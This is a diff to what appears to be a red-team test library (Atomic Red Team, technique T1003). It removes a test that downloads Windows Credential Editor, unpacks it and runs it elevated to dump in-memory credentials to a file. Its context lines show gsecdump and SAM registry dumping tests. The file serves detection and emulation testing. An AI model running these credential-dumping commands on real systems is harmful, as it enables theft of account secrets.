@@ -46,49 +46,6 @@ atomic_tests:
     command: |
       #{gsecdump_exe} -a
 
-- name: Windows Credential Editor
-  description: |
-    Dump credentials from memory using Windows Credential Editor from https://www.ampliasecurity.com/research/windows-credentials-editor/
-  supported_platforms:
-    - windows
-
-  input_arguments:
-    output_file:
-      description: Path where resulting data should be placed
-      type: Path
-      default: "%temp%\\output.txt"
-    wce_exe:
-      description: Path of Windows Credential Editor executable
-      type: Path
-      default: PathToAtomicsFolder\T1003\bin\wce.exe
-    wce_url:
-      description: Path to download Windows Credential Editor zip file
-      type: url
-      default: https://www.ampliasecurity.com/research/wce_v1_41beta_universal.zip
-    wce_zip_hash:
-      description: File hash of the Windows Credential Editor zip file
-      type: String
-      default: 8F4EFA0DDE5320694DD1AA15542FE44FDE4899ED7B3A272063902E773B6C4933
-
-  dependency_executor_name: powershell
-  dependencies:
-    - description: |
-        Windows Credential Editor must exist on disk at specified location (#{wce_exe})
-      prereq_command: |
-        if (Test-Path #{wce_exe}) {exit 0} else {exit 1}
-      get_prereq_command: |
-        $parentpath = Split-Path "#{wce_exe}"; $zippath = "$parentpath\wce.zip"
-        if(Invoke-WebRequestVerifyHash "#{wce_url}" "$zippath" #{wce_zip_hash}){
-          Expand-Archive $zippath $parentpath\wce -Force
-          Move-Item $parentpath\wce\wce.exe "#{wce_exe}"
-          Remove-Item $zippath, $parentpath\wce -Recurse
-        }
-
-  executor:
-    name: command_prompt
-    elevation_required: true
-    command: |
-      #{wce_exe} -o #{output_file}
 
 - name: Registry dump of SAM, creds, and secrets
   description: |
